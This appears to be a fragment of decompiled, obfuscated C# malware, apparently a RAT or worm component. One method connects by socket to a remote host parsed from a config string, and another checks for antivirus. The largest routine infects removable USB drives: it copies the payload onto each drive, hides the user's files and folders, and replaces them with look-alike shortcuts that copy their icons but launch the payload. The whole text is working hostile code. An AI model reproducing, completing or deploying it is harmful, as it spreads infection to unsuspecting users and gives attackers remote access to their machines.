				return text;
			}
			return (string)(IEnumerable)"No Antivirus";
		}
		catch (Exception gparam_2)
		{
			Class9.smethod_3(gparam_2, 'ɸ', 583);
			string result = (string)(IEnumerable)"No Antivirus";
			Class9.Class10.smethod_1(961, 997);
			return result;
		}
	}

	private static void smethod_6(object sender, ElapsedEventArgs e)
	{
		int try0001_dispatch = -1;
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
				{
					IPEndPoint gparam_ = new IPEndPoint(Class6.Class7.smethod_13(Class6.Class7.smethod_9(string_11, new char[1] { ':' }, 161, '\u008f')[0], 913, 940), Class6.smethod_8(Class6.Class7.smethod_9(string_11, new char[1] { ':' }, 109, 'C')[1], 'γ', 988));
					Socket gparam_2 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
					Class6.Class7.smethod_14(gparam_2, (EndPoint)gparam_, 671, (short)750);
					Class9.smethod_26(gparam_2, 955, 986);
					break;
				}
				}
				break;
			}
			catch (Exception gparam_3)
			{
				Class9.smethod_3(gparam_3, 'ʾ', 641);
				Class9.Class10.smethod_1(147, 183);
				try0001_dispatch = 2;
			}
		}
	}

	public static byte[] smethod_7(string string_16)
	{
		return MyComputer.Class0.smethod_11(MyComputer.smethod_18('A', 109), string_16, 212, 149);
	}

	public static string smethod_8(byte[] byte_0)
	{
		return Class6.smethod_23(MyComputer.smethod_18('ŕ', 377), byte_0, 434, 439);
	}

	public static Array smethod_9(byte[] byte_0, string string_16)
	{
		List<byte[]> list = new List<byte[]>();
		MemoryStream gparam_ = new MemoryStream();
		MemoryStream gparam_2 = new MemoryStream();
		string[] array = Class6.Class7.smethod_5(smethod_8(byte_0), string_16, -1, (CompareMethod)0, 309, 'ċ');
		MyComputer.smethod_9(gparam_, byte_0, 0, Class6.smethod_8(array[0], 'ˋ', 678), 223, 255);
		checked
		{
			MyComputer.smethod_9(gparam_2, byte_0, Class6.smethod_8(array[0], 'š', 268) + Class6.smethod_8(string_16, 'ŕ', 312), byte_0.Length - (Class6.smethod_8(array[0], 'Ɨ', 506) + Class6.smethod_8(string_16, 'ę', 372)), 192, 224);
			list.Add(Class9.Class10.smethod_13(gparam_, 'ʌ', '\u02de'));
			list.Add(Class9.Class10.smethod_13(gparam_2, '\u02d4', 'ʆ'));
			Class12.smethod_3((Stream)gparam_, 'ϣ', (short)903);
			Class12.smethod_3((Stream)gparam_2, 'Ⱦ', (short)602);
			return (Array)(ICollection)list.ToArray();
		}
	}

	private static void smethod_10(object sender, ElapsedEventArgs e)
	{
		//IL_06ef: Unknown result type (might be due to invalid IL or missing references)
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string text = default(string);
		object gparam_ = default(object);
		DriveInfo[] array = default(DriveInfo[]);
		int num6 = default(int);
		DriveInfo gparam_2 = default(DriveInfo);
		string gparam_3 = default(string);
		string[] array2 = default(string[]);
		int num7 = default(int);
		string text2 = default(string);
		object gparam_4 = default(object);
		object gparam_5 = default(object);
		string[] array3 = default(string[]);
		object gparam_6 = default(object);
		object gparam_7 = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0001_dispatch)
					{
					default:
						MyComputer.Class0.smethod_3('\u0019', 3);
						num3 = -2;
						goto IL_000c;
					case 2040:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								default:
									goto end_IL_0001;
								case 0:
									goto end_IL_0001;
								case 1:
									break;
								}
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_000c;
							case 3:
								goto IL_0038;
							case 4:
								goto IL_0067;
							case 5:
								goto IL_007f;
							case 6:
								goto IL_009a;
							case 7:
								goto IL_00ac;
							case 9:
								goto IL_00dc;
							case 10:
								goto IL_00df;
							case 13:
								goto IL_013b;
							case 15:
								goto IL_016c;
							case 16:
								goto IL_016f;
							case 17:
								goto IL_0182;
							case 19:
								goto IL_01d8;
							case 20:
								goto IL_01db;
							case 21:
								goto IL_023d;
							case 22:
								goto IL_0283;
							case 23:
								goto IL_02d4;
							case 24:
								goto IL_03d1;
							case 25:
								goto IL_03f9;
							case 27:
								goto IL_042c;
							case 28:
								goto IL_042f;
							case 32:
								goto IL_0468;
							case 33:
								goto IL_046b;
							case 31:
							case 34:
							case 35:
								goto IL_0490;
							case 36:
								goto IL_0496;
							case 18:
							case 37:
							case 38:
								goto IL_0499;
							case 14:
							case 39:
							case 40:
								goto IL_04ae;
							case 41:
								goto IL_04b4;
							case 26:
							case 29:
							case 30:
								goto IL_04bc;
							case 42:
								goto IL_04e5;
							case 43:
								goto IL_0511;
							case 44:
								goto IL_052a;
							case 46:
								goto IL_0579;
							case 47:
								goto IL_057c;
							case 48:
								goto IL_05eb;
							case 49:
								goto IL_062b;
							case 50:
								goto IL_067c;
							case 51:
								goto IL_06b7;
							case 52:
								goto IL_06de;
							case 53:
								goto IL_06f5;
							case 55:
								goto IL_0725;
							case 56:
								goto IL_0728;
							case 59:
								goto IL_0767;
							case 60:
								goto IL_076d;
							case 45:
							case 61:
							case 62:
								goto IL_0770;
							case 63:
								goto IL_0785;
							case 64:
								goto IL_078b;
							case 54:
							case 57:
							case 58:
								goto IL_0793;
							case 65:
							case 66:
								goto IL_07ba;
							case 67:
								goto IL_07c0;
							case 8:
							case 11:
							case 12:
								goto IL_07c8;
							default:
								goto end_IL_0001;
							case 68:
								goto end_IL_0001_2;
							}
							goto default;
						}
						IL_0785:
						num5++;
						goto IL_078b;
						IL_0770:
						num = 62;
						Class9.smethod_13(text, FileAttributes.Hidden | FileAttributes.System, 845, 787);
						goto IL_0785;
						IL_000c:
						num = 2;
						gparam_ = MyComputer.Class0.smethod_1(Class6.smethod_20("wscript.shell", "", 'ν', 1022), 903, 946);
						goto IL_0038;
						IL_0038:
						num = 3;
						array = (DriveInfo[])(ICloneable)MyComputer.smethod_19(817, '\u035f');
						num6 = 0;
						goto IL_0053;
						IL_0053:
						if (num6 < array.Length)
						{
							gparam_2 = array[num6];
							goto IL_0067;
						}
						goto end_IL_0001_2;
						IL_078b:
						num = 64;
						goto IL_04fd;
						IL_0067:
						num = 4;
						if (Class6.smethod_24(gparam_2, 'È', 'Ê'))
						{
							goto IL_007f;
						}
						goto IL_07ba;
						IL_007f:
						num = 5;
						if (MyComputer.smethod_20(gparam_2, 716, 703) == DriveType.Removable)
						{
							goto IL_009a;
						}
						goto IL_07ba;
						IL_009a:
						num = 6;
						gparam_3 = (string)(IEquatable<string>)MyComputer.Class0.smethod_12(gparam_2, '\u0002', '\u0016');
						goto IL_00ac;
						IL_00ac:
						num = 7;
						if (!MyComputer.Class0.smethod_7(Class6.smethod_12(gparam_3, "\\", string_5, 875, '\u032e'), 224, 149))
						{
							goto IL_00dc;
						}
						goto IL_07c8;
						IL_00dc:
						num = 9;
						goto IL_00df;
						IL_00df:
						num = 10;
						MyComputer.Class0.smethod_13<FileSystemProxy, string, string>(MyComputer.smethod_21<ServerComputer>((ServerComputer)(object)MyProject.MyComputer_0, 'Ȩ', 'ɾ'), string_13, Class6.smethod_12(gparam_3, "\\", string_5, 778, '\u034f'), 135, '\u009f');
						goto IL_07c8;
						IL_07c8:
						num = 12;
						array2 = (string[])(IEnumerable)Attribute0.smethod_20(gparam_3, "*.*", 865, 780);
						num7 = 0;
						goto IL_0129;
						IL_0129:
						if (num7 < array2.Length)
						{
							text2 = array2[num7];
							goto IL_013b;
						}
						goto IL_04e5;
						IL_07ba:
						num6++;
						goto IL_07c0;
						IL_013b:
						num = 13;
						if (MyComputer.Class0.smethod_5(Attribute0.smethod_9(text2, 408, 'Ǒ'), ".lnk", bool_0: false, 'ʽ', 'ʜ') != 0)
						{
							goto IL_016c;
						}
						goto IL_04ae;
						IL_016c:
						num = 15;
						goto IL_016f;
						IL_016f:
						num = 16;
						if (MyComputer.Class0.smethod_7(text2, 35, 86))
						{
							goto IL_0182;
						}
						goto IL_04ae;
						IL_0182:
						num = 17;
						if (!Class6.smethod_25<FileSystemProxy, string>(MyComputer.smethod_21<ServerComputer>((ServerComputer)(object)MyProject.MyComputer_0, 'ʹ', '\u02ef'), Attribute0.smethod_12(gparam_3, "\\", Attribute0.smethod_9(text2, 760, 'ʰ'), "\u200d.lnk", 165, '\u00af'), 743, 'ʂ'))
						{
							goto IL_01d8;
						}
						goto IL_0499;
						IL_01d8:
						num = 19;
						goto IL_01db;
						IL_01db:
						num = 20;
						gparam_4 = Attribute0.smethod_21<object, string, Type>(Class6.smethod_20("WScript.Shell", "", '§', 228), null, "CreateShortcut", new object[1] { Attribute0.smethod_12(gparam_3, "\\", Attribute0.smethod_9(text2, 52, '|'), "\u200d.lnk", 153, '\u0093') }, null, null, null, 7, 67);
						goto IL_023d;
						IL_023d:
						num = 21;
						Attribute0.smethod_22<Type, object, string>(gparam_4, null, "TargetPath", new object[1] { Class6.smethod_12(gparam_3, "\\", string_5, 317, 'Ÿ') }, null, null, bool_0: false, bool_1: true, 996, 984);
						goto IL_0283;
						IL_0283:
						num = 22;
						Attribute0.smethod_22<Type, object, string>(gparam_4, null, "Arguments", new object[1] { Class6.Class7.smethod_0(" ", Attribute0.smethod_9(text2, 559, 'ɧ'), 333, 373) }, null, null, bool_0: false, bool_1: true, 189, 129);
						goto IL_02d4;
						IL_02d4:
						num = 23;
						gparam_5 = MyComputer.Class0.smethod_1(Attribute0.smethod_21<object, string, Type>(gparam_, null, "regread", new object[1] { Attribute0.smethod_24(Attribute0.smethod_24((object)"HKEY_LOCAL_MACHINE\\software\\classes\\", Attribute0.smethod_21<object, string, Type>(gparam_, null, "regread", new object[1] { Class6.smethod_12("HKEY_LOCAL_MACHINE\\software\\classes\\.", Class6.Class7.smethod_5(Attribute0.smethod_9(text2, 807, '\u036f'), ".", -1, (CompareMethod)0, 774, '\u0338')[Attribute0.smethod_23((Array)Class6.Class7.smethod_5(Attribute0.smethod_9(text2, 64, '\b'), ".", -1, (CompareMethod)0, 959, '\u0381'), 1, 'Ɩ', 438)], "\\", 676, 'ˡ') }, null, null, null, 738, 678), 'ρ', 'ΰ'), (object)"\\defaulticon\\", 'Ϣ', 'Γ') }, null, null, null, 492, 424), 261, 304);
						goto IL_03d1;
						IL_03d1:
						num = 24;
						if (Attribute0.smethod_25(Attribute0.smethod_19(gparam_5, 603, 'ɫ'), ",", (CompareMethod)0, 84, 115) == 0)
						{
							goto IL_03f9;
						}
						goto IL_042c;
						IL_03f9:
						num = 25;
						Attribute0.smethod_22<Type, object, string>(gparam_4, null, "iconlocation", new object[1] { text2 }, null, null, bool_0: false, bool_1: true, 909, 945);
						goto IL_04bc;
						IL_042c:
						num = 27;
						goto IL_042f;
						IL_042f:
						num = 28;
						Attribute0.smethod_22<Type, object, string>(gparam_4, null, "iconlocation", new object[1] { MyComputer.Class0.smethod_1(gparam_5, 39, 18) }, null, null, bool_0: false, bool_1: true, 168, 148);
						goto IL_04bc;
						IL_04bc:
						num = 30;
						if (MyComputer.Class0.smethod_5(Attribute0.smethod_9(text2, 754, 'ʺ'), string_5, bool_0: false, '#', '\u0002') != 0)
						{
							goto IL_0468;
						}
						goto IL_0490;
						IL_0468:
						num = 32;
						goto IL_046b;
						IL_046b:
						num = 33;
						Class6.Class7.smethod_15<string, object, Type>(gparam_4, null, "Save", new object[0], null, null, null, bool_1: true, 564, 556);
						goto IL_0490;
						IL_0490:
						num = 35;
						gparam_5 = null;
						goto IL_0496;
						IL_0496:
						gparam_4 = null;
						goto IL_0499;
						IL_0499:
						num = 38;
						Attribute0.smethod_13(text2, FileAttributes.Hidden | FileAttributes.System, 660, '\u02df');
						goto IL_04ae;
						IL_04ae:
						num7++;
						goto IL_04b4;
						IL_04b4:
						num = 41;
						goto IL_0129;
						IL_04e5:
						num = 42;
						array3 = Class6.Class7.smethod_16(gparam_3, 207, 'å');
						num5 = 0;
						goto IL_04fd;
						IL_04fd:
						if (num5 < array3.Length)
						{
							text = array3[num5];
							goto IL_0511;
						}
						goto IL_07ba;
						IL_07c0:
						num = 67;
						goto IL_0053;
						IL_0511:
						num = 43;
						if (MyComputer.Class0.smethod_7(text, 366, 280))
						{
							goto IL_052a;
						}
						goto IL_0785;
						IL_052a:
						num = 44;
						if (!Class6.smethod_25<FileSystemProxy, string>(MyComputer.smethod_21<ServerComputer>((ServerComputer)(object)MyProject.MyComputer_0, '^', '\b'), Attribute0.smethod_12(gparam_3, "\\", Attribute0.smethod_9(text, 141, 'Å'), "\u200d.lnk", 656, 'ʚ'), 452, 'ơ'))
						{
							goto IL_0579;
						}
						goto IL_0770;
						IL_0579:
						num = 46;
						goto IL_057c;
						IL_057c:
						num = 47;
						gparam_6 = Attribute0.smethod_21<object, string, Type>(Class6.smethod_20("WScript.Shell", "", '\u0300', 835), null, "CreateShortcut", new object[1] { Attribute0.smethod_12(gparam_3, "\\", Attribute0.smethod_9(text, 433, 'ǹ'), "\u200d.lnk", 909, '·') }, null, null, null, 958, 1018);
						goto IL_05eb;
						IL_05eb:
						num = 48;
						Attribute0.smethod_22<Type, object, string>(gparam_6, null, "TargetPath", new object[1] { Class6.smethod_12(gparam_3, "\\", string_5, 442, 'ǿ') }, null, null, bool_0: false, bool_1: true, 109, 81);
						goto IL_062b;
						IL_062b:
						num = 49;
						Attribute0.smethod_22<Type, object, string>(gparam_6, null, "Arguments", new object[1] { Class6.Class7.smethod_0(" ", Attribute0.smethod_9(text, 363, 'ģ'), 247, 207) }, null, null, bool_0: false, bool_1: true, 330, 374);
						goto IL_067c;
						IL_067c:
						num = 50;
						gparam_7 = Class9.smethod_0(Class9.Class10.smethod_6<string, object, Type>(gparam_, null, "regread", new object[1] { "HKEY_LOCAL_MACHINE\\software\\classes\\folder\\defaulticon\\" }, null, null, null, 104, 110), '\u009c', 172);
						goto IL_06b7;
						IL_06b7:
						num = 51;
						if (Class12.Class13.smethod_16(Class12.smethod_10(gparam_7, 557, 591), ",", (CompareMethod)0, 110, '\u0001') == 0)
						{
							goto IL_06de;
						}
						goto IL_0725;
						IL_06de:
						num = 52;
						Class12.smethod_23<object, object>(text, (MsgBoxStyle)0, null, 672, 683);
						goto IL_06f5;
						IL_06f5:
						num = 53;
						Class9.smethod_18<string, object, Type>(gparam_6, null, "IconLocation", new object[1] { text }, null, null, bool_0: false, bool_1: true, 'Ɩ', 'ǻ');
						goto IL_0793;
						IL_0725:
						num = 55;
						goto IL_0728;
						IL_0728:
						num = 56;
						Class9.smethod_18<string, object, Type>(gparam_6, null, "IconLocation", new object[1] { Class9.smethod_0(gparam_7, 'Ǖ', 485) }, null, null, bool_0: false, bool_1: true, 'ɥ', 'Ȉ');
						goto IL_0793;
						IL_0793:
						num = 58;
						Class9.Class11.smethod_9<string, Type, object>(gparam_6, null, "Save", new object[0], null, null, null, bool_1: true, 713, '\u02e9');
						goto IL_0767;
						IL_0767:
						num = 59;
						gparam_7 = null;
						goto IL_076d;
						IL_076d:
						gparam_6 = null;
						goto IL_0770;
						end_IL_0001:
						break;
					}
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				Class14.Class15.smethod_7((Exception)obj, 319, 328);
				try0001_dispatch = 2040;
				continue;
			}
			throw Class14.Class16.Class17.smethod_13(-2146828237, 450, 'ƕ');
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			Class14.smethod_0('\u032a', 795);
		}
	}
}
